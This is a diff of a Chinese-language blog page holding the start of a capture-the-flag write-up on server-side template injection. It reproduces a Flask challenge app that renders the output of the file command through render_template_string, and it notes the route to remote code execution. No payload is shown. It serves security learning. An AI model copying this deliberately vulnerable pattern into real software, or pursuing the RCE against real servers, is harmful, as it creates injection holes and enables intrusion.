@@ -1,450 +1,78 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>SSTI - Potat0w0</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Potat0w0"><meta name="msapplication-TileImage" content="/img/icon.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Potat0w0"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="SSTI"><meta property="og:type" content="blog"><meta property="og:title" content="SSTI"><meta property="og:url" content="http://example.com/2023/02/09/ssti/"><meta property="og:site_name" content="Potat0w0"><meta property="og:description" content="SSTI"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/default2.png"><meta property="article:published_time" content="2023-02-09T08:31:25.000Z"><meta property="article:modified_time" content="2024-01-10T09:41:51.125Z"><meta property="article:author" content="Potat0w0"><meta property="article:tag" content="Web"><meta property="article:tag" content="ssti"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/img/default2.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/02/09/ssti/"},"headline":"SSTI","image":["http://example.com/img/default2.png"],"datePublished":"2023-02-09T08:31:25.000Z","dateModified":"2024-01-10T09:41:51.125Z","author":{"@type":"Person","name":"Potat0w0"},"publisher":{"@type":"Organization","name":"Potat0w0","logo":{"@type":"ImageObject","url":"http://example.com/img/icon.jpg"}},"description":"SSTI"}</script><link rel="canonical" href="http://example.com/2023/02/09/ssti/"><link rel="icon" href="/img/icon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
 
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
 
-<!DOCTYPE html>
-<html lang="en" data-default-color-scheme=dark>
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
 
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/icon.jpg" alt="Potat0w0" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">时间轴</a><a class="navbar-item" href="/categories">归档</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="fill" src="/img/default2.png" alt="SSTI"></span></div><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-02-09T08:31:25.000Z" title="2023/2/9 16:31:25">2023-02-09</time>发表</span><span class="level-item"><time dateTime="2024-01-10T09:41:51.125Z" title="2024/1/10 17:41:51">2024-01-10</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">常见漏洞</a><span> / </span><a class="link-muted" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a></span><span class="level-item">1 小时读完 (大约8219个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">SSTI</h1><div class="content"><!-- more -->
 
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
-  <link rel="icon" href="/img/icon.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="Potat0w0">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="sources:https:&#x2F;&#x2F;docs.jinkan.org&#x2F;docs&#x2F;jinja2&#x2F;templates.html#builtin-filters https:&#x2F;&#x2F;jinja.palletsprojects.com&#x2F;en&#x2F;3.1.x&#x2F;templates&#x2F; https:&#x2F;&#x2F;dormousehole.readthedocs.io&#x2F;en&#x2F;latest&#x2F; https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;">
-<meta property="og:type" content="article">
-<meta property="og:title" content="SSTI">
-<meta property="og:url" content="http://example.com/2023/02/09/ssti/index.html">
-<meta property="og:site_name" content="Potat0w0">
-<meta property="og:description" content="sources:https:&#x2F;&#x2F;docs.jinkan.org&#x2F;docs&#x2F;jinja2&#x2F;templates.html#builtin-filters https:&#x2F;&#x2F;jinja.palletsprojects.com&#x2F;en&#x2F;3.1.x&#x2F;templates&#x2F; https:&#x2F;&#x2F;dormousehole.readthedocs.io&#x2F;en&#x2F;latest&#x2F; https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429032204160.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429032353870.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429030651913.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429032742576.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429034451879.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429191534591.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429191635511.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429191927593.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429193849800.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429193915755.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429194117415.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429194209528.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429195640928.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429195803084.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429195958840.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730212602385.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730212648721.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730212858437.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730213654861.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730213714396.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730215716944.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730215805610.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730225207888.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730233526240.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731005556778.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731012232999.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731021637628.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731021730919.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731021752614.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731021832024.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731025126135.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731024741335.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731030014042.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731030026544.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731025728066.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731030517813.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731170423110.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731180156155.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731183825048.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801020731807.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801021306517.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801021603150.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801021808956.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801023029680.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801023528609.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801030534571.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801034608529.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801042557864.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801042414133.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801171743303.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801174345081.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801174537355.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801180249226.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802003013611.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801222353241.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801224316737.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801235148461.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801235916098.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802000940569.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802002124378.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802002143318.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802003435533.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802001152213.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802002515106.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802002356262.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802002419304.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802005306318.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802005341317.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802005523502.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802005559881.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802010231838.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802011023942.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802011047462.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802013135950.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802013210012.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802193034146.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802193133736.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802013559353.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802015231902.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802020434847.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802020620149.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802032116868.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802023425961.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802030842185.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802152241886.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802135939015.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802142259287.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802145108337.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802150900349.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802151957916.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802152224096.png">
-<meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802172049912.png">
-<meta property="article:published_time" content="2023-02-09T08:31:25.000Z">
-<meta property="article:modified_time" content="2023-08-02T11:51:00.813Z">
-<meta property="article:author" content="Potat0w0">
-<meta property="article:tag" content="Web">
-<meta property="article:tag" content="ssti">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/02/09/ssti/image-20230429032204160.png">
-  
-  
-    <meta name="referrer" content="no-referrer-when-downgrade">
-  
-  
-  <title>SSTI - Potat0w0</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":50,"cursorChar":"💕","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>Potat0w0&#39;s Blog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                <span>Home</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>Archives</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                <span>Categories</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>Tags</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                <span>About</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                <span>Links</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="SSTI"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-author" aria-hidden="true"></i>
-        Potat0w0
-      </span>
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-02-09 16:31" pubdate>
-          February 9, 2023 pm
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          32k words
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          267 mins
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="busuanzi_container_page_pv" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="busuanzi_value_page_pv"></span> views
-        </span>
-        
-      
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">SSTI</h1>
-            
-              <p class="note note-info">
-                
-                  
-                    Last updated on 5 months ago
-                  
-                
-              </p>
-            
-            
-              <div class="markdown-body">
-                
-                <h2 id="sources"><a href="#sources" class="headerlink" title="sources:"></a>sources:</h2><p><a target="_blank" rel="noopener" href="https://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters">https://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters</a></p>
+<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="sources"><a href="#sources" class="headerlink" title="sources:"></a>sources:</h2><p><a target="_blank" rel="noopener" href="https://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters">https://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters</a></p>
 <p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.1.x/templates/">https://jinja.palletsprojects.com/en/3.1.x/templates/</a></p>
 <p><a target="_blank" rel="noopener" href="https://dormousehole.readthedocs.io/en/latest/">https://dormousehole.readthedocs.io/en/latest/</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584">https://xz.aliyun.com/t/9584</a></p>
 <h2 id="2023FCTF热身赛filechecker-mini"><a href="#2023FCTF热身赛filechecker-mini" class="headerlink" title="2023FCTF热身赛filechecker_mini"></a>2023FCTF热身赛filechecker_mini</h2><p>打开题目，让我们上传一个文件：</p>
-<p><img src="/2023/02/09/ssti/image-20230429032204160.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230429032204160.png"></p>
 <p>桌面上随便丢了个php文件进去提交看看会有啥情况：</p>
-<p><img src="/2023/02/09/ssti/image-20230429032353870.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230429032353870.png"></p>
 <p>判断文件类型，(MIME绕过预定)</p>
 <p>附件下载下来先看源码：</p>
 <p>index.html：</p>
-<p><img src="/2023/02/09/ssti/image-20230429030651913.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230429030651913.png"></p>
 <p>可以看出该网页使用模块渲染将result值渲染进index对应位置，那么就看下后端代码app.py：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> waitress <span class="hljs-keyword">import</span> serve<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><br>app_dir = os.path.split(os.path.realpath(__file__))[<span class="hljs-number">0</span>]<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app_dir&#125;</span>/upload/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,result=<span class="hljs-string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>            f = request.files[<span class="hljs-string">&#x27;file-upload&#x27;</span>]<br>            filepath = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)<br><br>            <span class="hljs-keyword">if</span> os.path.exists(filepath) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-keyword">in</span> filepath:<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                f.save(filepath)<br>                file_check_res = subprocess.check_output(<br>                    [<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>                    shell=<span class="hljs-literal">False</span>, <br>                    encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>                    timeout=<span class="hljs-number">1</span><br>                )<br>                os.remove(filepath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;empty&quot;</span> <span class="hljs-keyword">in</span> file_check_res <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;cannot open&quot;</span> <span class="hljs-keyword">in</span> file_check_res:<br>                    file_check_res=<span class="hljs-string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span><br>                <span class="hljs-keyword">return</span> render_template_string(file_check_res)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    serve(app, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>, threads=<span class="hljs-number">1000</span>, cleanup_interval=<span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230429032742576.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230429032742576.png"></p>
 <p>上面大家都用<code>render_template()</code>就你爱用<code>render_template_string()</code>是吧（指指点点，一眼模板注入，那么我们就希望<code>file_check_res</code>里有我们能够执行的rce代码。<code>file_check_res</code>哪来的？倒退往上看。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">f.save(filepath)<br>file_check_res = subprocess.check_output(<br>	[<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>	shell=<span class="hljs-literal">False</span>, <br>	encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>	imeout=<span class="hljs-number">1</span><br>	)<br>os.remove(filepath)<br></code></pre></td></tr></table></figure>
 
